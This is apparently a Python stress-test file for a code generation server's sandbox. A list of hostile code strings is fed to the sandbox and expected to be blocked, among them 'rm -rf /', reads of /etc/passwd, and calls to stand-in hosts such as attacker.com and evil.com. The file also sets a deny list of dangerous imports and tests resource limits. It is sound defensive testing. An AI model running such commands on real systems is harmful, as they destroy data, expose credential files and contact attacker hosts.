"""
Security Stress Test for Code Generation Server
Tests security measures under high load and adversarial conditions
"""

import asyncio
import time
from datetime import datetime

from code_generation_tool_server import create_code_generation_server


async def test_dangerous_code_blocking():
    """Test that dangerous code is properly blocked"""
    print("🛡️ Testing Dangerous Code Blocking")

    dangerous_codes = [
        "import os; os.system('rm -rf /')",
        "import subprocess; subprocess.run(['curl', 'malicious-site.com'])",
        "open('/etc/passwd', 'r').read()",
        "import socket; socket.connect(('attacker.com', 80))",
        "exec('__import__(\"os\").system(\"malicious_command\")')",
        "eval('open(\"/etc/hosts\").read()')",
        "__import__('urllib.request').urlopen('http://evil.com')",
        "import sys; sys.exit(1)"
    ]

    server = await create_code_generation_server()
    blocked_count = 0

    try:
        for i, dangerous_code in enumerate(dangerous_codes, 1):
            print(f"   Testing dangerous code {i}/8")
            result = await server.execute_code_sandboxed(
                dangerous_code,
                user_id="stress_test"
            )

            # Should be blocked by security validation
            if not result.success or not result.data.get("success", False):
                blocked_count += 1
                print(f"   ✅ Blocked: {dangerous_code[:50]}...")
            else:
                print(f"   ❌ SECURITY BREACH: {dangerous_code[:50]}...")

        success_rate = (blocked_count / len(dangerous_codes)) * 100
        print(f"   🔒 Security blocking rate: {blocked_count}/{len(dangerous_codes)} ({success_rate:.1f}%)")

        return success_rate >= 90

    finally:
        await server.stop()


async def test_resource_limits():
    """Test resource consumption limits"""
    print("🚦 Testing Resource Limits")

    resource_intensive_codes = [
        # Memory bomb
        "x = [0] * (10**6)",
        # CPU intensive
        "sum(i**2 for i in range(100000))",
        # Infinite loop (should timeout)
        "while True: pass",
        # Large output
        "print('A' * 10000)",
        # Recursive function
        "def f(n): return f(n+1) if n < 1000 else n\nf(0)"
    ]

    server = await create_code_generation_server()
    controlled_count = 0

    try:
        for i, code in enumerate(resource_intensive_codes, 1):
            print(f"   Testing resource control {i}/5")
            start_time = time.time()

            result = await server.execute_code_sandboxed(
                code,
                timeout=2.0,  # Short timeout
                user_id="stress_test"
            )

            execution_time = time.time() - start_time

            # Should complete within reasonable time or be terminated
            if execution_time <= 3.0:  # Allow 1 second buffer
                controlled_count += 1
                print(f"   ✅ Resource controlled: {execution_time:.2f}s")
            else:
                print(f"   ❌ RESOURCE EXCEEDED: {execution_time:.2f}s")

        success_rate = (controlled_count / len(resource_intensive_codes)) * 100
        print(f"   ⏱️ Resource control rate: {controlled_count}/{len(resource_intensive_codes)} ({success_rate:.1f}%)")

        return success_rate >= 80

    finally:
        await server.stop()


async def test_concurrent_operations():
    """Test security under concurrent load"""
    print("⚡ Testing Concurrent Security")

    server = await create_code_generation_server()

    async def safe_operation(user_id):
        """Safe code generation operation"""
        return await server.generate_code(
            f"Create a hello function for user {user_id}",
            user_id=user_id
        )

    async def malicious_operation(user_id):
        """Attempt malicious code execution"""
        return await server.execute_code_sandboxed(
            "import os; os.listdir('/')",
            user_id=user_id
        )

    try:
        # Create mixed workload
        tasks = []

        # Add safe operations
        for i in range(10):
            tasks.append(safe_operation(f"safe_user_{i}"))

        # Add malicious operations
        for i in range(5):
            tasks.append(malicious_operation(f"malicious_user_{i}"))

        print(f"   Running {len(tasks)} concurrent operations...")
        start_time = time.time()

        results = await asyncio.gather(*tasks, return_exceptions=True)

        execution_time = time.time() - start_time
        print(f"   ⏱️ Total execution time: {execution_time:.2f}s")

        # Analyze results
        safe_operations = 10
        malicious_operations = 5

        safe_success = sum(1 for r in results[:safe_operations] if isinstance(r, object) and hasattr(r, 'success') and r.success)
        malicious_blocked = sum(1 for r in results[safe_operations:] if isinstance(r, object) and hasattr(r, 'success') and not r.success)

        print(f"   ✅ Safe operations successful: {safe_success}/{safe_operations}")
        print(f"   🛡️ Malicious operations blocked: {malicious_blocked}/{malicious_operations}")

        # Security should remain effective under load
        security_maintained = (malicious_blocked / malicious_operations) >= 0.8
        performance_maintained = execution_time < 30.0  # Should complete in reasonable time

        return security_maintained and performance_maintained

    finally:
        await server.stop()


async def test_code_generation_quality():
    """Test that generated code meets safety standards"""
    print("📝 Testing Code Generation Quality")

    server = await create_code_generation_server()
    quality_checks = 0
    total_checks = 0

    try:
        specifications = [
            "Create a function to calculate factorial",
            "Create a class for user authentication",
            "Create a function to validate email addresses",
            "Create a utility for file operations",
            "Create a data structure for caching"
        ]

        for spec in specifications:
            result = await server.generate_code(spec, user_id="quality_test")

            if result.success:
                code = result.data["code"]
                total_checks += 1

                # Basic quality checks
                quality_score = 0
                max_score = 4

                # Check 1: Code has proper structure (def/class)
                if "def " in code or "class " in code:
                    quality_score += 1

                # Check 2: Code has docstrings
                if '"""' in code:
                    quality_score += 1

                # Check 3: No dangerous imports
                dangerous_imports = ['os', 'subprocess', 'sys', 'socket']
                if not any(f"import {mod}" in code for mod in dangerous_imports):
                    quality_score += 1

                # Check 4: Has proper return or method structure
                if "return " in code or "def " in code:
                    quality_score += 1

                quality_percentage = (quality_score / max_score) * 100

                if quality_percentage >= 75:
                    quality_checks += 1
                    print(f"   ✅ Quality check passed: {quality_percentage:.0f}%")
                else:
                    print(f"   ⚠️ Quality check failed: {quality_percentage:.0f}%")

        success_rate = (quality_checks / total_checks) * 100 if total_checks > 0 else 0
        print(f"   📊 Code quality rate: {quality_checks}/{total_checks} ({success_rate:.1f}%)")

        return success_rate >= 80

    finally:
        await server.stop()


async def run_security_stress_tests():
    """Run comprehensive security stress tests"""
    print("🧪 CODE GENERATION SECURITY STRESS TESTS")
    print("=" * 60)
    print("Testing security measures under adversarial conditions")
    print("and high-load scenarios to ensure robust protection.\n")

    tests = [
        ("Dangerous Code Blocking", test_dangerous_code_blocking),
        ("Resource Limits Enforcement", test_resource_limits),
        ("Concurrent Security", test_concurrent_operations),
        ("Code Generation Quality", test_code_generation_quality)
    ]

    results = []

    for test_name, test_func in tests:
        print(f"\n{test_name.upper()}")
        print("-" * 50)

        try:
            start_time = time.time()
            result = await test_func()
            execution_time = time.time() - start_time

            results.append((test_name, result))
            status = "✅ PASS" if result else "❌ FAIL"
            print(f"   {status} ({execution_time:.2f}s)\n")

        except Exception as e:
            print(f"   ❌ ERROR: {e}\n")
            results.append((test_name, False))

    # Summary
    print("=" * 60)
    print("🔒 SECURITY STRESS TEST RESULTS")
    print("=" * 60)

    passed = sum(1 for _, result in results if result)
    total = len(results)

    for test_name, result in results:
        status = "✅ PASS" if result else "❌ FAIL"
        print(f"   {test_name}: {status}")

    success_rate = (passed / total) * 100
    print(f"\n📈 Security Success Rate: {passed}/{total} ({success_rate:.1f}%)")

    if success_rate >= 90:
        print("\n🎉 SECURITY STRESS TESTS PASSED!")
        print("   Code generation server security validated under stress")
        print("   All security measures functioning correctly")
        print("   Ready for production deployment with confidence")
    elif success_rate >= 70:
        print("\n⚠️ Some security measures need strengthening")
        print("   Consider additional hardening before production")
    else:
        print("\n❌ CRITICAL SECURITY VULNERABILITIES FOUND")
        print("   DO NOT deploy until security issues are resolved")

    return success_rate >= 90


if __name__ == "__main__":
    success = asyncio.run(run_security_stress_tests())
    exit(0 if success else 1)